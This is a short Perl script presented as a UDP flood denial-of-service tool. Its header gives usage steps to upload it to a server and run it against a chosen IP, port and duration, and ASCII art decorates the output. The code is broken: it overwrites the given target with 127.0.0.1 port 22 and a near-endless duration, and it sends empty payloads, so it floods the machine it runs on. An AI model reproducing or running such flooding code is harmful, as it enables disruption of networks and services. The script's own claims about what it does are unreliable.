#!/usr/bin/perl
#####################################
# How to use ( 3 steps )            #
#####################################
# 1 Save as dos.pl                  #
# 2 Upload to server                #
# 3 Type "perl dos.pl IP PORT TIME" #
#####################################
use Socket;
$ARGC = ( @ARGV );
my( $ip, $port, $size, $time );
$ip = ( $ARGV[0] );
$port = ( $ARGV[1] );
$time = ( $ARGV[2] );
socket( Flood, PF_INET, SOCK_DGRAM, 17 );
$addr = ( inet_aton( "$ip" ) );
print <<EOTEXT;
 
                       .
                      dM
                      MMr
                     4MMML                  .
                     MMMMM.                xf
     .              "M6MMM               .MM-
      Mh..          +MM5MMM            .MMMM
      .MMM.         .MMMMML.          MMMMMh
       )MMMh.        MM5MMM         MMMMMMM
        3MMMMx.     'MMM3MMf      xnMMMMMM"
        '*MMMMM      MMMMMM.     nMMMMMMP"
         *MMMMMx    "MMM5M    .MMMMMMM=
           *MMMMMh   "MMMMM"   JMMMMMMP
             MMMMMM   GMMMM.  dMMMMMM            .
              MMMMMM  "MMMM  .MMMMM(        .nnMP"
   ..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*
    "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"
     "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
       ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
          *PMMMMMMhn. *x > M  .MMMM**""
             ""**MMMMhx/.h/ .=*"
                      .3P"%....
                    nP"     "*MMnx
 
EOTEXT
printf "";
$addr = ( inet_aton( "127.0.0.1" ) );
$port = ( 22 );
$time = ( 2147483647 );
$endon = ( time() + $time );
while( $endon > time() )
{
 $size = ( $rand x $rand x $rand );
 send( Flood, 0, $size, sockaddr_in( $port, $addr ) );
}